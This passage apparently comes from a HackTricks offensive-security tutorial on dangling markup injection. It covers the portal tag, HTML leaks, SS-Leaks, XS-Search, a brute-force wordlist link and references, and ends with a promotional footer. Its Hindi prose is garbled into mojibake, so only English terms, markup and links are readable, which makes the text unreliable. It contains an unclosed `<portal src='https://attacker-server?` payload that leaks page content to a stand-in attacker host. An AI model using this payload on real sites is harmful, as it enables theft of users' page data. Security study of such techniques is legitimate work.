### рдирдпрд╛ \<portal HTML рдЯреИрдЧ

рдЖрдк \<portal рдЯреИрдЧ рдХреА рдЦреЛрдЬреА рдЧрдИ рд╕рдВрднрд╛рд╡рд┐рдд рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдкрд░ рдПрдХ рдмрд╣реБрдд **рд░реЛрдЪрдХ рд╢реЛрдз** [рдпрд╣рд╛рдБ](https://research.securitum.com/security-analysis-of-portal-element/) рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред\
рдЗрд╕ рд▓реЗрдЦрди рдХреЗ рд╕рдордп рдЖрдкрдХреЛ Chrome рдореЗрдВ `chrome://flags/#enable-portals` рдкрд░ рдЬрд╛рдХрд░ portal рдЯреИрдЧ рдХреЛ рд╕рдХреНрд╖рдо рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рдирд╣реАрдВ рддреЛ рдпрд╣ рдХрд╛рдо рдирд╣реАрдВ рдХрд░реЗрдЧрд╛ред
```markup
<portal src='https://attacker-server?
```
### HTML рд▓реАрдХреНрд╕

HTML рдореЗрдВ рд╕рднреА рдкреНрд░рдХрд╛рд░ рдХреЗ рд▓реАрдХреНрд╕ рдЙрдкрдпреЛрдЧреА рдирд╣реАрдВ рд╣реЛрддреЗ рд╣реИрдВ Dangling Markup рдХреЗ рд▓рд┐рдП, рдкрд░ рдХрднреА-рдХрднреА рдпрд╣ рдорджрдж рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрдиреНрд╣реЗрдВ рдпрд╣рд╛рдБ рджреЗрдЦреЗрдВ: [https://github.com/cure53/HTTPLeaks/blob/master/leak.html](https://github.com/cure53/HTTPLeaks/blob/master/leak.html)

## SS-Leaks

рдпрд╣ **dangling markup рдФрд░ XS-Leaks рдХреЗ рдмреАрдЪ рдХрд╛** **рдорд┐рд╢реНрд░рдг** рд╣реИред рдПрдХ рдУрд░ рдпрд╣ рднреЗрджреНрдпрддрд╛ **HTML рдЗрдВрдЬреЗрдХреНрдЯ** рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ (рдкрд░ JS рдирд╣реАрдВ) рдЙрд╕реА рдкреЗрдЬ рдкрд░ рдЬрд┐рд╕рдХрд╛ рд╣рдо рд╣рдорд▓рд╛ рдХрд░реЗрдВрдЧреЗред рджреВрд╕рд░реА рдУрд░ рд╣рдо рд╕реАрдзреЗ рдЙрд╕ рдкреЗрдЬ рдкрд░ рд╣рдорд▓рд╛ рдирд╣реАрдВ рдХрд░реЗрдВрдЧреЗ рдЬрд╣рд╛рдБ рд╣рдо HTML рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдмрд▓реНрдХрд┐ **рджреВрд╕рд░реЗ рдкреЗрдЬ** рдкрд░ рдХрд░реЗрдВрдЧреЗред

{% content-ref url="ss-leaks.md" %}
[ss-leaks.md](ss-leaks.md)
{% endcontent-ref %}

## XS-Search/XS-Leaks

XS-Search **рдХреНрд░реЙрд╕-рдУрд░рд┐рдЬрд┐рди рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рдирд┐рдХрд╛рд▓рдиреЗ** рдХреЗ рд▓рд┐рдП рдУрд░рд┐рдПрдВрдЯреЗрдб рд╣реИрдВ, **рд╕рд╛рдЗрдб рдЪреИрдирд▓ рд╣рдорд▓реЛрдВ** рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗред рдЗрд╕рд▓рд┐рдП, рдпрд╣ Dangling Markup рд╕реЗ рдЕрд▓рдЧ рддрдХрдиреАрдХ рд╣реИ, рд╣рд╛рд▓рд╛рдВрдХрд┐, рдХреБрдЫ рддрдХрдиреАрдХреЗрдВ HTML рдЯреИрдЧреНрд╕ рдХреЗ рд╢рд╛рдорд┐рд▓ рдХрд░рдиреЗ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рддреА рд╣реИрдВ (JS рдирд┐рд╖реНрдкрд╛рджрди рдХреЗ рд╕рд╛рде рдФрд░ рдмрд┐рдирд╛), рдЬреИрд╕реЗ [**CSS Injection**](../xs-search.md#css-injection) рдпрд╛ [**Lazy Load Images**](../xs-search.md#image-lazy-loading)**.**

{% content-ref url="../xs-search.md" %}
[xs-search.md](../xs-search.md)
{% endcontent-ref %}

## Brute-Force Detection List

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/dangling_markup.txt" %}

## рд╕рдВрджрд░реНрдн

рдпрд╣рд╛рдБ рдкреНрд░рд╕реНрддреБрдд рд╕рднреА рддрдХрдиреАрдХреЗрдВ рдФрд░ рдЕрдзрд┐рдХ рд╡рд┐рд╕реНрддрд╛рд░ рд╕реЗ рджреЗрдЦреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ:

{% embed url="http://lcamtuf.coredump.cx/postxss/" %}

рдЕрдиреНрдп HTML рдЯреИрдЧреНрд╕ рдЬрд┐рдирдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдпрд╣рд╛рдБ рдкрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:

{% embed url="http://www.thespanner.co.uk/2011/12/21/html-scriptless-attacks/" %}

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП:

{% embed url="https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup" %}

<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рдирд╛рдпрдХ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рдПрдХреНрд╕рдХреНрд▓реВрд╕рд┐рд╡ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдпрд╛ **Twitter** рдкрд░ рдореБрдЭреЗ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) **рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдВ**.
* **рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, HackTricks** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ.

</details>
